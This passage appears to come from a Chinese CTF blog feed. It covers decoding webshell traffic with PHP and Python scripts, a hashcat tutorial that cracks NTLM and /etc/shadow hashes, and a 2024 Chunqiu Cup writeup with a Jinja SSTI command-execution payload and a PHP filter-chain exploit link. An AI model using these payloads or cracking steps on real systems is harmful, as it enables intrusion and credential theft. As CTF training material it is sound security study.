&quot;lFDu8RwONqmag5ex45089b3446eeSapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KLWVSMCOW4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaq88Ykq5AQp8Y5Ku1nbYo0yjmWk/JdGMnvNM6SvX9LEE2xigxZnaBkevdBZ0SzjRJMK8tdPvGU8jCHt7GAH5H26TORj1sKJr5Kun5azyBfL7VycyFicwHpZ3dNlCfQKgmnXwXjqOUaEoQzUKr1Tl8I4triU1OQURapT0lulJK50NfNqPGAXJ8Xn1V2LYVm0G5XJRBNy/ReWo7ed+7l6s/MxHEyH6XMnfBeZdtpmA619VEnyc79tzVa40twaBUYtr6UaH3BnKkQN1shhZwzITAiwEK4xOJ1MO0nIRsvyXOCE5ABChBqc7g3tN79p7dZ6sjNZ2TQl4s7AtCOzyP2KBEXLE9lyrhwjV9N+n3uE3MfQvjChErcCmWNfuE7mcHq4W8XunjLiw4W5cHWaJiEzqDeza77m3+cPvHijF0HB52HNyEedxDbZOahxSuXnUmDO+k49fVa/s5h/wppFk/vjEHgg83Mo3zpAMsw5UqJTogEihVRbGDY5wUenU0nW70cdM45s3+wEA9a8VsDn2tgRPBnbNhtktiE3A7S+DH1fsV52Nf1V/sQbS5ssncWL/6EWJuwy42AK3I4s6lgzCT3An2Hf5rhfGXPpogKVGeIGexqRSrjv09hGwqBSeYJO8EHrI6IqWeFoDuYEI2jvP2DAM/+zri6Z8n2fsDkDeBbyYtFBHr7f2NqbL4AcTuszXn9pcqH238vIjZaPJBqbqvDTzeOsEYDc01cLkHk4rzqYoLQq9m7arE591m+q1sKHBsa0lcqqVpfpLjo7H0UzWt2uHlVNUjr96ijvXvNermcaEfhatwceGBGR64xGuZWAzN8o1I+V6469kyeG5pfE3uaDo0EcFlW7TdogYacKoMRTeOE0vcNibkNKaRj9CiAc/jrKrq+Nm30eYtpC5AZh38Cc85V6B2T3e16g4p1dJ9fgwWTSTbVQrv2zsJEp4QgFoyiuYrPIV62Lx++LhGsiVMyRnCh4deY5WX8vBuZOfC5Nhg==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3yn9OYyvPisf3VobnQcgMjZ13f4I4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92&quot;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 定义正则表达式模式</span><br><span class="line">pattern = re.compile(r&#x27;lFDu8RwONqmag5ex45089b3446ee(.*?)4e0d86dbcf92&#x27;)</span><br><span class="line"></span><br><span class="line"># 提取并打印结果</span><br><span class="line">for string in strings:</span><br><span class="line">    match = pattern.search(string)</span><br><span class="line">    if match:</span><br><span class="line">        extracted_string = match.group(1)</span><br><span class="line">        print(f&quot;Extracted: &#123;extracted_string&#125;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;No match found in: &#123;string&#125;&quot;)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>反解$r的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$k=&quot;161ebd7d&quot;;$kh=&quot;45089b3446ee&quot;;$kf=&quot;4e0d86dbcf92&quot;;$p=&quot;lFDu8RwONqmag5ex&quot;;</span><br><span class="line">function x($t,$k)&#123;</span><br><span class="line">  $c=strlen($k);$l=strlen($t);$o=&quot;&quot;;</span><br><span class="line">  for($i=0;$i&lt;$l;)&#123;</span><br><span class="line">    for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)</span><br><span class="line">    &#123;</span><br><span class="line">      $o.=$t[$i]^$k[$j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r=array(&quot;SaoCUFRXAGExNS5kaQ==&quot;,&quot;SaoCUVRSBofUNDFgR2Uu&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3Gn9+Y9vPGke3VobnQcgMjZ07P4e&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sap6KU+uuy3+Gn+oqy3SgTM2GBxmng==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KDcNeR4REFocJJk1HBl0qNk7deBc=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRocex13UHArABWxOndUQ9OgshQjxynrZlCq/6T5cu61Krv/IHD3+b2orH9lOVptWeGII4RxOXL8430BAdncvckuSSO0sLezOyQtVRZDXEBUIN0WNIiXiPDjTSEHYr27l+n0o2bkLikF+AhTDZWmqPLwPjZQDwG2XfWAkgPXY1EUbDC4bYsoIhZp4dXo5aotJl8EN2fSNHw/A6OAF3bAzSZ0VwBTYY5PCI1JO6H3dvTFKjQH1eUHgFG2VQRT5weB1TK8SJbDV7ljYnci/EA=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sapk9b8P9VQl8+6WNSyPLHPzvij/ylGSUNpA5t/uHJmJm+BTi7aP7VLJygt/d3FEQUimFkyDmbL8mFAVMhgF+1Gs7oBe4PQqwN9d2TrCgLfYKoAmZ0Urg7pPrwOnlrE0kk7EkRo4ixqPCo6yK130dz4vGutEl+3+73+xeqIlSVX5Yto45yKnaJCMGyqoTnnS8wwwP+8n50+ZdAM4qvo/mRr+y5ip4DufES6xa2CtH70/I8loiokseAeG7uOO/6knTkKXYtT3jYy4nkA9pBHV16zWEk9K4rbAYxUP7Wg5VjiTuQIOXn7obn8BiHrv0F7qr/0wsTDNvohMh/nDE48kg7Q6aOF9LRLGw3q0CC9v7TJ1ESDAK+/EDa1VVxZ2NFhCau/sJPDj7RIoyYcQM6DngEBgUAdYZHmZ1JaIgRat0p2LPt0KBKwtw7whLX8IYbleQO+EAw6Z9xoxfeTrfg==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoMNdkK9FQ96jqRfbz7Eb2ahw+iHTdlC4Jycu3Wc6NzHvj1CkDJnwN7Y0tlljncCpyGmLWKkJ8P9vn7+LMgkb6enEWqTEEo6SqEXMEx0hkif8i1ylrtYQMZtXrJOmPDJdFRbnFNkW5LpGJo7YkFXvcsKco+DEXDYbfwpfoOLwbRVOG7szZ2/62QRq1YgBUHQ3WMH6R9AKmA60x7lNTaxCR4own8gOMQQHihtK6txmaS+OFGZJXAN7voVNEJvBXvFOZdq3JAPdTCjmeAlrPcstZowZPuO43GbdE=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KLWVSMCOW&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Saq88Ykq5AQp8Y5Ku1nbYo0yjmWk/JdGMnvNM6SvX9LEE2xigxZnaBkevdBZ0SzjRJMK8tdPvGU8jCHt7GAH5H26TORj1sKJr5Kun5azyBfL7VycyFicwHpZ3dNlCfQKgmnXwXjqOUaEoQzUKr1Tl8I4triU1OQURapT0lulJK50NfNqPGAXJ8Xn1V2LYVm0G5XJRBNy/ReWo7ed+7l6s/MxHEyH6XMnfBeZdtpmA619VEnyc79tzVa40twaBUYtr6UaH3BnKkQN1shhZwzITAiwEK4xOJ1MO0nIRsvyXOCE5ABChBqc7g3tN79p7dZ6sjNZ2TQl4s7AtCOzyP2KBEXLE9lyrhwjV9N+n3uE3MfQvjChErcCmWNfuE7mcHq4W8XunjLiw4W5cHWaJiEzqDeza77m3+cPvHijF0HB52HNyEedxDbZOahxSuXnUmDO+k49fVa/s5h/wppFk/vjEHgg83Mo3zpAMsw5UqJTogEihVRbGDY5wUenU0nW70cdM45s3+wEA9a8VsDn2tgRPBnbNhtktiE3A7S+DH1fsV52Nf1V/sQbS5ssncWL/6EWJuwy42AK3I4s6lgzCT3An2Hf5rhfGXPpogKVGeIGexqRSrjv09hGwqBSeYJO8EHrI6IqWeFoDuYEI2jvP2DAM/+zri6Z8n2fsDkDeBbyYtFBHr7f2NqbL4AcTuszXn9pcqH238vIjZaPJBqbqvDTzeOsEYDc01cLkHk4rzqYoLQq9m7arE591m+q1sKHBsa0lcqqVpfpLjo7H0UzWt2uHlVNUjr96ijvXvNermcaEfhatwceGBGR64xGuZWAzN8o1I+V6469kyeG5pfE3uaDo0EcFlW7TdogYacKoMRTeOE0vcNibkNKaRj9CiAc/jrKrq+Nm30eYtpC5AZh38Cc85V6B2T3e16g4p1dJ9fgwWTSTbVQrv2zsJEp4QgFoyiuYrPIV62Lx++LhGsiVMyRnCh4deY5WX8vBuZOfC5Nhg==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3yn9OYyvPisf3VobnQcgMjZ13f4I&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==&quot;);</span><br><span class="line">for ($i=0;$i&lt;count($r);$i++) &#123;</span><br><span class="line">    $decr=gzuncompress(x(base64_decode($r[$i]),$k));</span><br><span class="line">    print($decr);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118153433654.png" alt="image-20250118153433654"></p><blockquote><p>flag{arsjxh-sjhxbr-3rdd78dfsh-3ndidjl}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hashcat常规使用方法</title>
      <link href="/posts/7ca0c84c.html"/>
      <url>/posts/7ca0c84c.html</url>
      
        <content type="html"><![CDATA[<h3 id="m-hash的类型">-m hash的类型</h3><p>指定hash的加密类型，默认是MD5类型<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323151218880-546683178.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323151218880-546683178.png" alt="img"></a><br>在对应的类型前面有它的id,可以通过id来指定类型<br>当我们想要找一个类型在<code>hashcat</code>支不支持的时候，例如windows系统加密的是NTML,可以执行命令<br><code>hashcat64.exe -h | findstr NTLM</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323151441885-831306097.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323151441885-831306097.png" alt="img"></a><br>可以看到<code>NTLM</code>的ID号为<code>1000</code></p><h3 id="a-攻击方式">-a 攻击方式</h3><p>破解密码的方式<br>分别有:</p><p>highlighter- 1c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0 | Straight  字典破解</span><br><span class="line">1 | Combination  组合破解</span><br><span class="line">3 | Brute-force  掩码破解</span><br><span class="line">6 | Hybrid Wordlist + Mask  混合字典 + 掩码</span><br><span class="line">7 | Hybrid Mask + Wordlist  混合掩码 +  字典</span><br></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323150232206-1864847787.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323150232206-1864847787.png" alt="img"></a></p><h3 id="掩码">掩码</h3><p>当没有字典的时候，可以使用掩码指定密码的每一位是什么类型的字符，首先我们知道密码有多少位<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323153207489-2145128247.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323153207489-2145128247.png" alt="img"></a><br>例如:<code>?d?d?d?d?d?d?d?d</code>代表密码为8为数字，<code>?u?l?l?l?l?d?d?d</code>代表密码为7位，首个字母大写，然后四个小写字母，最后三个数字</p><h3 id="破解windows-hash密码">破解windows hash密码</h3><p><strong>使用字典爆破windows hash</strong><br><code>hashcat64.exe -a 0 -m 1000 hash或者hashfile 字典文件</code><br>准备好我们的密码本，这里我使用的是手写的<code>2.txt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152446755-1468474769.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152446755-1468474769.png" alt="img"></a><br><code>hashcat64.exe -a 0 -m 1000 e45a314c664d40a227f9540121d1a29d 2.txt</code><br>执行后会进入这样一个状态，这里每个可能不一样，在破解成功或者跑完字典后会自动停止<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152907726-1543846375.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152907726-1543846375.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152938264-999245190.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152938264-999245190.png" alt="img"></a><br>可以看到我们的密码已经被破解出来，为<code>Admin123</code><br>在破解后，会在根目录下的<code>hashcat.potfile</code>文件记录这个hash的缓存<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323154735555-892319052.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323154735555-892319052.png" alt="img"></a></p><p><strong>使用掩码破解windows hash</strong><br><code>hashcat64.exe -a 3 -m 1000 e45a314c664d40a227f9540121d1a29d ?u?l?l?l?l?d?d?d</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323155148658-906395823.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323155148658-906395823.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323155209806-1669173198.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323155209806-1669173198.png" alt="img"></a><br>破解成功</p><p>在我们爆破的同时，会有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt;</span><br></pre></td></tr></table></figure><p>分别：查看破解状态，暂停，绕过，检查，退出</p><p>还有如下例子：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118140015954.png" alt="image-20250118140015954"></p><h3 id="破解Linux-hash密码">破解Linux hash密码</h3><p>在<code>linux</code>中，我们知道，密码分别存储在/etc/passwd和/etc/shadow中，只需要<code>more /etc/shadow</code>，将其中的文件复制出来，使用工具破解即可<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323193627170-854468310.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323193627170-854468310.png" alt="img"></a><br>将root和jackson用户的密码保存到<code>/var/www/html/pass</code>Web服务目录中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$90/diajJs2fHcIGa$hB5wj4tMF8Qdd6o5VNRTY4v4vEpV8x0NP4O1N/tpJ8ns7JmJ8RyvSih7.W8TQdfwweUFh16dJejFpKw07i2uR1::0:99999:7:::</span><br><span class="line">jackson:$6$Zje1WaoS$eH24JFr5n67149yBcDWWsfxME5cYlOXMmJxnf2uinbvYm8vWc0BmjvAoXIFY/0ZUJItRpPhHkCGDiqjXT10EV0:19066:0:99999:7:::</span><br></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220324083051894-306061497.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220324083051894-306061497.png" alt="img"></a><br>注意这里的换行，一个用户的hash值是一行<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195519376-1688604181.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195519376-1688604181.png" alt="img"></a><br>启动Web服务<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195250088-790012495.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195250088-790012495.png" alt="img"></a><br>并在实验机器下载，这里使用certutil将pass文件内容下载到了D盘下的pass文件中去<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323194800417-621412828.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323194800417-621412828.png" alt="img"></a><br><strong>Linux使用的是 sha512crypt加密方式</strong>，在hashcat中寻找是否有该方法<br><code>hashcat64.exe -h|findstr sha512crypt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195736516-1164859720.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195736516-1164859720.png" alt="img"></a><br>代号为<code>1800</code><br>继续使用我们的<code>2.txt</code>对<code>d:\pass</code>文件进行暴力破解<br><code>hashcat64.exe -a 0 -m 1800 d:\pass 2.txt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323200929852-624191296.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323200929852-624191296.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323201016538-1015617615.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323201016538-1015617615.png" alt="img"></a><br>这里我更换了<code>root</code>和<code>jackson</code>用户在文件中的位置<br>爆破成功，得到<code>jackson</code>的密码为<code>root</code>，但是只爆破出了一个密码，应该只支持一个密码的破解<br><strong><code>注意:复制的时候一定不要有换行，不然是无法破解成功的</code></strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年春秋杯网络安全联赛冬季赛wp-1.17</title>
      <link href="/posts/b245cfb0.html"/>
      <url>/posts/b245cfb0.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="easy-flask">easy_flask</h4><blockquote><p>考点：ssti 注入</p></blockquote><p>打开网页，发现有个登录，试试直接登录</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165333225.png" alt="image-20250117165333225"></p><p>看到 url 处是进行 get 传参，试试 111</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165407490.png" alt="image-20250117165407490"></p><p>联想到 ssti 漏洞，于是用9验证一下，发现就是 ssti 模板注入</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165456193.png" alt="image-20250117165456193"></p><p>进行 ssti 模板注入漏洞一系列，构造 payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.next.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165555735.png" alt="image-20250117165555735"></p><blockquote><p>flag{48ad0cde8345c8b2608933ac4e85147e}</p></blockquote><h4 id="file-copy">file_copy</h4><blockquote><p>考点：无回显，filter协议</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230203872.png" alt="image-20250117230203872"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230233073.png" alt="image-20250117230233073"></p><p>根据代码，可以看到是post传参，参数是path。（抓包也可以看）</p><p>直接使用脚本（<a href="https://github.com/ProbiusOfficial/PHPinclude-labs/tree/bbb08b030623d481be51edea063433b8d77b2ee7/Level%2017/php_filter_chains_oracle_exploit-main%EF%BC%89">https://github.com/ProbiusOfficial/PHPinclude-labs/tree/bbb08b030623d481be51edea063433b8d77b2ee7/Level 17/php_filter_chains_oracle_exploit-main）</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230452787.png" alt="image-20250117230452787"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230507242.png" alt="image-20250117230507242"></p><blockquote><p>flag{894272cc-8e8d-47f7-9565-39636508492a}</p></blockquote><h2 id="Misc">Misc</h2><h4 id="简单算数">简单算数</h4><p>考点：异或</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165811554.png" alt="image-20250117165811554"></p><p>直接进行字符串异或，得到 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165855506.png" alt="image-20250117165855506"></p><blockquote><p>flag{x0r_Brute_is_easy!}</p></blockquote><h4 id="See-anything-in-these-pics">See anything in these pics</h4><blockquote><p>考点：文件分离</p></blockquote><p>解压后是一个二维码和一个压缩包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170037763.png" alt="image-20250117170037763"></p><p>扫描二维码，得到解压缩包的密码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170129000.png" alt="image-20250117170129000"></p><p>解压后得到一张 jpg 图片。先放进 010editor 看一下，发现隐藏了文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170256270.png" alt="image-20250117170256270"></p><p>用 binwalk 探测，然后提取，得到一张 png 图片</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170348138.png" alt="image-20250117170348138"></p><p>放进 010editor 查看，可能宽高被修改过，于是修改宽高得到原图</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170548575.png" alt="image-20250117170548575"></p><blockquote><p>flag{opium_00pium}</p></blockquote><h4 id="简单提取镜像">简单提取镜像</h4><blockquote><p>考点：流量分析，数据修复</p></blockquote><p>解压文件得到一个流量包，进行流量分析，导出文件，得到一个 zip 文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171207275.png" alt="image-20250117171207275"></p><p>解压 zip 文件，得到一个破损的 img 文件，根据提示，可能可以使用 RR-Studio 工具修复。</p><p>可以直接进行文件分离，得到一个 excl 表格，得到 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171347734.png" alt="image-20250117171347734"></p><blockquote><p>flag{E7A10C15E26AA5750070EF756AAA1F7C}</p></blockquote><h4 id="压力大，写个脚本吧">压力大，写个脚本吧</h4><blockquote><p>考点：脚本编写能力</p></blockquote><p><img src="E:/%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5/%E5%B7%A5%E5%85%B7/typora/Typora/upload/image-20250117171504745.png" alt="image-20250117171504745"></p><p>很明显是有密码的套娃压缩包，直接编写脚本解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import base64</span><br><span class="line">for i in range(99,0,-1):</span><br><span class="line">    i=str(i)</span><br><span class="line">    zipname = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧\\zip_&quot;+i+&quot;.zip&quot;</span><br><span class="line">    passwd_path = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧\\password_&quot;+i+&quot;.txt&quot;</span><br><span class="line">    passwd = open(passwd_path, &quot;r&quot;).read()</span><br><span class="line">    passwd = base64.b64decode(passwd)</span><br><span class="line">    print(passwd)</span><br><span class="line">    ts1 = zipfile.ZipFile(zipname,&#x27;r&#x27;)</span><br><span class="line">    ts1.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧&quot;,pwd=passwd)</span><br><span class="line">    ts1.close()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171704899.png" alt="image-20250117171704899"></p><p>提示是 png，然后我们将 password_0.txt 的密码进行 base64 解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89504E470D0A1A0A0000000D494844520000019000000190</span><br></pre></td></tr></table></figure><p>发现是个 png 文件头，所以这些密码应该组合在一起就是一张 png 图片。脚本直接放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">stringall = &quot;&quot;</span><br><span class="line">for i in range(0, 100):</span><br><span class="line">    i = str(i)</span><br><span class="line">    passwd_path = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧\\password_&quot;+i+&quot;.txt&quot;</span><br><span class="line">    string = open(passwd_path, &quot;r&quot;).read()</span><br><span class="line">    stringall += string</span><br><span class="line">print(base64.b64decode(stringall))</span><br></pre></td></tr></table></figure><p>得到一张二维码，直接扫，就得到了 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172005199.png" alt="image-20250117172005199"></p><blockquote><p>flag{<em>PASSWORDs_is_fl@g!</em>}</p></blockquote><h4 id="ez-forensics">ez_forensics</h4><blockquote><p>考点：镜像取证</p></blockquote><p>下载附件解压，先文件扫描一下看看，查找一下关键词</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121134845419.png" alt="image-20250121134845419"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121134909012.png" alt="image-20250121134909012"></p><p>将这两个文件（压缩包和txt）提取出来，发现压缩包解压需要密码。查看hint.txt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135038002.png" alt="image-20250121135038002"></p><p>60 = 13 +47，想到用rot13和rot47解密，得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135247193.png" 